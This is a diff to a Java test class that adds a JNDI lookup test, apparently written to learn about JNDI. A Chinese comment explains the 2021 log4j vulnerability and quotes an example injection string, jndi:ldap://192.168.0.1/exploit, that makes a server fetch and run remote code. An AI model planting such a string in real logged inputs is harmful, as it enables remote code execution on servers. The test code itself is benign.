@@ -40,6 +40,8 @@ import org.apache.commons.lang3.time.DateFormatUtils;
 import org.junit.Assert;
 import org.junit.Test;
 import org.slf4j.MDC;
+import org.springframework.jndi.JndiObjectTargetSource;
+import org.springframework.jndi.JndiTemplate;
 import org.springframework.util.CollectionUtils;
 import org.springframework.util.LinkedMultiValueMap;
 import org.springframework.util.MultiValueMap;
@@ -49,6 +51,9 @@ import org.stringtemplate.v4.ST;
 import ucar.ma2.*;
 import ucar.nc2.*;
 
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
 import javax.validation.ConstraintViolation;
 import javax.validation.Validation;
 import javax.validation.Validator;
@@ -1449,6 +1454,51 @@ public class TempTest {
 
         // disconnect with the server
         ldapConnection.disconnect();
+
+
+    }
+    // ref:https://mp.weixin.qq.com/s/FouhOPacCOMYq153xaw-3A
+    // 2021-12-11 log4j 漏洞
+    // 原理：黑客可以通过日志中输入jndi:ldap://192.168.0.1/exploit,通过ldap协议远程下载恶意攻击代码到本地服务器上，执行代码，攻击服务器
+    /**
+     * Java Naming and Directory Interface：Java命名和目录接口
+     * ref:https://tomcat.apache.org/tomcat-8.5-doc/jndi-resources-howto.html
+     */
+    public @Test void testJDNI() throws NamingException {
+
+        class MyBean{
+            private String foo = "Default Foo";
+
+            public String getFoo() {
+                return (this.foo);
+            }
+
+            public void setFoo(String foo) {
+                this.foo = foo;
+            }
+
+            private int bar = 0;
+
+            public int getBar() {
+                return (this.bar);
+            }
+
+            public void setBar(int bar) {
+                this.bar = bar;
+            }
+
+        }
+
+        // spring中的JDNI实现
+        JndiTemplate jndiTemplate=new JndiTemplate();
+        JndiObjectTargetSource source=new JndiObjectTargetSource();
+
+        Context initCtx = new InitialContext();
+        Context envCtx = (Context) initCtx.lookup("java:comp/env");
+        MyBean bean = (MyBean) envCtx.lookup("bean/MyBeanFactory");
+
+        System.out.println("foo = " + bean.getFoo() + ", bar = " +
+                bean.getBar());
 
     }
     public @Test void test(){}
